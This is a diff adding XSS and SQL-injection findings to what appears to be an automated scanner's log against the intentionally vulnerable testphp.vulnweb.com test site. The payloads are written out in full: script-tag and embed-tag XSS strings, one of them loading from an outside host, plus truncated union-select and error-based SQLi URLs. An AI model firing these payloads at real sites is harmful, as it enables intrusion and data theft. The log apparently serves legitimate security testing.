@@ -364,3 +364,51 @@ URL: http://testphp.vulnweb.com/artists.php?artist=-1 union select 1, group_conc
 Payload: '
 URL: http://testphp.vulnweb.com/listproducts.php?cat=123"><script>alert(45)</script>&zfdfasdf='
 
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <embed src=//14.rs>
+Keys: {'searchFor': '<embed src=//14.rs>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <sCript x>(((confirm)))``</scRipt x>
+Keys: {'searchFor': '<sCript x>(((confirm)))``</scRipt x>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: POST
+URL: http://testphp.vulnweb.com/search.php?test=query
+Payload: <sCript x>(((confirm)))``</scRipt x>
+Keys: {'searchFor': '<sCript x>(((confirm)))``</scRipt x>', 'goButton': 'goButton'}
+
+---------------[Xss found!]-----------------
+Method: GET
+URL: http://testphp.vulnweb.com/listproducts.php?cat=%3CsCript%20x%3E(((confirm)))%60%60%3C/scRipt%20x%3E
+Payload: <sCript x>(((confirm)))``</scRipt x>
+
+---------------[SQLi found!]-----------------
+[sql-injection]
+Payload: '
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=(SELECT CONCAT(CONCAT(0x7176716271,(CASE WHEN (1674='
+
+---------------[SQLi found!]-----------------
+[sql-injection]
+Payload: '
+URL: http://testphp.vulnweb.com/AJAX/infoartist.php?id=(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176716271,(SELECT (ELT(7432='
+
+---------------[SQLi found!]-----------------
+[sql-injection]
+Payload: '
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1+Union+Select+@k:='
+
+---------------[SQLi found!]-----------------
+[sql-injection]
+Payload: '
+URL: http://testphp.vulnweb.com/search.php?test=query='
+
+---------------[SQLi found!]-----------------
+[sql-injection]
+Payload: '
+URL: http://testphp.vulnweb.com:80/categories.php/listproducts.php?cat='
+
